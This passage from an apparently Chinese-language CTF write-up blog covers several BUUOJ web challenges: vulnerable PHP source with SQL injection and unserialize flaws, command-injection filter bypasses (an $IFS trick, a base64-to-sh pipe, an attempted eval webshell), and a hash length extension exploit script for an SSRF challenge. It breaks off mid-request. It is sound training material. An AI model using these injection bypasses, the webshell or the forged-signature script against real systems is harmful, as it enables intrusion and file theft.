plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line">&lt;?php require_once &apos;db.php&apos;; ?&gt;</span><br><span class="line">&lt;?php require_once &apos;user.php&apos;; ?&gt;</span><br><span class="line">&lt;?php require_once &apos;error.php&apos;; ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$db = new DB();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;ko&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot;</span><br><span class="line">          content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;User&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;?php require_once &apos;bootstrap.php&apos;; ?&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$no = $_GET[&apos;no&apos;];</span><br><span class="line">if ($db-&gt;anti_sqli($no))</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;no hack ~_~&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$res = $db-&gt;getUserByNo($no);</span><br><span class="line">$user = unserialize($res[&apos;data&apos;]);</span><br><span class="line">//print_r($res);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">    &lt;table class=&quot;table&quot;&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                username</span><br><span class="line">            &lt;/th&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                age</span><br><span class="line">            &lt;/th&gt;</span><br><span class="line">            &lt;th&gt;</span><br><span class="line">                blog</span><br><span class="line">            &lt;/th&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;?php echo $res[&apos;username&apos;]; ?&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;?php echo $user-&gt;age; ?&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                &lt;?php echo xss($user-&gt;blog); ?&gt;</span><br><span class="line">            &lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;p&gt;the contents of his/her blog&lt;/p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line"></span><br><span class="line">    $response = $user-&gt;getBlogContents();</span><br><span class="line">    if ($response === 404)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;404 Not found&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $base64 = base64_encode($response);</span><br><span class="line">        echo &quot;&lt;iframe width=&apos;100%&apos; height=&apos;10em&apos; src=&apos;data:text/html;base64,&#123;$base64&#125;&apos;&gt;&quot;;</span><br><span class="line">        // echo $response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // var_dump($user-&gt;getBlogContents());</span><br><span class="line">    ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>db.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &apos;lib.php&apos;;</span><br><span class="line">$mysqli = new mysqli(&apos;127.0.0.1&apos;, &apos;root&apos;, &apos;naiwjebfahjebfja&apos;, &apos;fakebook&apos;);</span><br><span class="line"></span><br><span class="line">class DB &#123;</span><br><span class="line"></span><br><span class="line">function __construct() &#123;</span><br><span class="line">// $mysqli = new mysqli(&apos;localhost&apos;, &apos;root&apos;, &apos;!@#1234!@#&apos;, &apos;fakebook&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function isValidUsername($username) &#123;</span><br><span class="line">global $mysqli;</span><br><span class="line">$query = &quot;select * from users where username = &apos;&#123;$username&#125;&apos;&quot;;</span><br><span class="line">$res = $mysqli-&gt;query($query);</span><br><span class="line">if (!$res-&gt;fetch_array()) &#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($username, $passwd) &#123;</span><br><span class="line">global $mysqli;</span><br><span class="line"></span><br><span class="line">$username = addslashes($username);</span><br><span class="line">$passwd = sha512($passwd);</span><br><span class="line">$query = &quot;select * from users where username = &apos;&#123;$username&#125;&apos; and passwd = &apos;&#123;$passwd&#125;&apos;&quot;;</span><br><span class="line">$res = $mysqli-&gt;query($query);</span><br><span class="line"></span><br><span class="line">return $res-&gt;fetch_array();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function insertUser($username, $passwd, $data) &#123;</span><br><span class="line">global $mysqli;</span><br><span class="line"></span><br><span class="line">$username = substr($username, 0, 100);</span><br><span class="line">$username = addslashes($username);</span><br><span class="line">$passwd = sha512($passwd);</span><br><span class="line">$data = serialize($data);</span><br><span class="line">$data = addslashes($data);</span><br><span class="line"></span><br><span class="line">$query = &quot;insert into users (username, passwd, data) values (&apos;&#123;$username&#125;&apos;, &apos;&#123;$passwd&#125;&apos;, &apos;&#123;$data&#125;&apos;)&quot;;</span><br><span class="line">return $mysqli-&gt;real_query($query);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function getAllUsers() &#123;</span><br><span class="line">global $mysqli;</span><br><span class="line"></span><br><span class="line">$query = &quot;select * from users&quot;;</span><br><span class="line">$res = $mysqli-&gt;query($query);</span><br><span class="line">return $res-&gt;fetch_all(MYSQLI_ASSOC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function getUserByNo($no) &#123;</span><br><span class="line">global $mysqli;</span><br><span class="line"></span><br><span class="line">// $no = addslashes($no);</span><br><span class="line">$query = &quot;select * from users where no = &#123;$no&#125;&quot;;</span><br><span class="line">$res = $mysqli-&gt;query($query);</span><br><span class="line">if (!$res) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;[*] query error! (&#123;$mysqli-&gt;error&#125;)&lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return $res-&gt;fetch_assoc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function anti_sqli($no) &#123;</span><br><span class="line">$patterns = &quot;/union\Wselect|0x|hex/i&quot;;</span><br><span class="line"></span><br><span class="line">return preg_match($patterns, $no);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">CREATE TABLE `users` ( `no` INT NOT NULL AUTO_INCREMENT , `username` VARCHAR(100) NOT NULL , `passwd` VARCHAR(128) NOT NULL , `data` TEXT NOT NULL , PRIMARY KEY (`no`)) ENGINE = MyISAM;</span><br><span class="line"></span><br><span class="line"> */</span><br></pre></td></tr></table></figure><h3 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h3><h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><p>先测试什么能用</p><p>过滤<code>&#39; 、&quot; 、 {}、空格、[]、*、?</code>、/</p><p>绕过空格可以 <code>${IFS},$IFS,</code></p><p>这里 <code>$IFS</code> 绕过空格</p><p><code>127.0.0.1;ls$IFS-l</code> 看到 flag.php。 尝试读 <code>127.0.0.1;cat$IFSflag.php</code>,过滤了 <code>flag</code> 关键字，尝试传马</p><p> <code>;echo -e &quot;&lt;?php @eval(\$_POST[122]);?&gt;&quot; &gt; 233.php</code> </p><p>但是因为过滤了引号，也失败了。现在只能尝试构造关键字 flag 。</p><p>尝试内联执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;a=f;b=ag;c=l;cat$IFS$a$c$b.php</span><br></pre></td></tr></table></figure><p>这里需要注意定义变量的顺序 <code>acd</code> 就会被检测出含有 flag。</p><p>执行完查看源代码即可。</p><p>还可以编码绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh ==&gt; cat flag.php</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://blog.csdn.net/silence1_/article/details/96135760" target="_blank" rel="noopener">命令注入绕过</a></p><h3 id="SSRFME"><a href="#SSRFME" class="headerlink" title="SSRFME"></a>SSRFME</h3><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):     </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>分析代码可知：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/De1ta 从我们传入的url 和 cookie中得到参数 -&gt; waf() 禁用敏感协议 -&gt; Task() -&gt; Exec()</span><br><span class="line"></span><br><span class="line">-&gt; 先检查Sign-checkSign()</span><br><span class="line">     getSign(self.action, self.param) == self.sign</span><br><span class="line">     hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line">        </span><br><span class="line">-&gt; 判断动作</span><br><span class="line">scan-<span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action <span class="comment"># 注意是 in</span></span><br><span class="line">    </span><br><span class="line">       tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">       resp = scan(self.param)</span><br><span class="line">           urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">           <span class="keyword">print</span> resp</span><br><span class="line">           tmpfile.write(resp)</span><br><span class="line">        </span><br><span class="line">read-<span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">       f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">       result[<span class="string">'data'</span>] = f.read()</span><br></pre></td></tr></table></figure><p>可以看到我们要先通过 <code>checkSign()</code> 的检查以后才能进行下一步。而在代码中专门给出一个路由，将生成的 Sign 发送给用户，也就是告诉了我们加密的结果。</p><p>于是，我知道了 md5 加密的一个结果，从 <code>hashlib.md5(secert_key + param + action).hexdigest()</code> 以及 <code>secert_key</code> 长度已知，可以使用 <code>hash extend attack</code> 来构造合适的<code>sign</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input Signature: <span class="number">9</span>f1d78f610b5e32249e30d1161ff4e81</span><br><span class="line">Input Data: local_file:flag.txtscan</span><br><span class="line">Input Key Length: <span class="number">16</span></span><br><span class="line">Input Data to Add: read</span><br><span class="line"><span class="number">4</span>a0fa89f8745038437386ca78367e28d</span><br><span class="line">local_file:flag.txtscan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x01\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure><p>我们注意到要得到文件的内容需要 read in action , 于是我们填充 read 。</p><p>payload.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://a917963c-0d87-4c23-b312-40315cbdd792.node3.buuoj.cn"</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># get Sign</span></span><br><span class="line">route = <span class="string">"/geneSign"</span></span><br><span class="line"></span><br><span class="line">re1 = s.get(url + route+<span class="string">"?param=local_file:flag.txt"</span>)</span><br><span class="line"><span class="keyword">print</span> re1.content, re1.request.headers</span><br><span class="line"></span><br><span class="line">hashs = <span class="string">"4a0fa89f8745038437386ca78367e28d"</span></span><br><span class="line">action = <span class="string">"scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read"</span></span><br><span class="line"><span class="comment"># action = a.replace("\\x", "%")</span></span><br><span class="line"><span class="keyword">print</span> action</span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">"action"</span>: action,</span><br><span class="line">    <span class="string">"sign"</span>: hashs,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">route2 = <span class="string">"/De1ta"</span></span><br><span class="line">re2 = s.get(url + route2 + <span class="string">"?param=local_file:flag.txt"</span>, cookies=cookie)</span><br><span class="line"><span class="keyword">print</span> re2.content</span><br></pre></td></tr></table></figure><h3 id="Buy-Flag"><a href="#Buy-Flag" class="headerlink" title="Buy Flag"></a>Buy Flag</h3><p>查看源码发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抓包传数据：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pay.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: b1fc07df-c7ae-46e3-8a06-565ab682d9ca.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">DNT</span>: 1</span><br><span class="line"><span class="attribute">Cookie</span>: user=1</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span>: 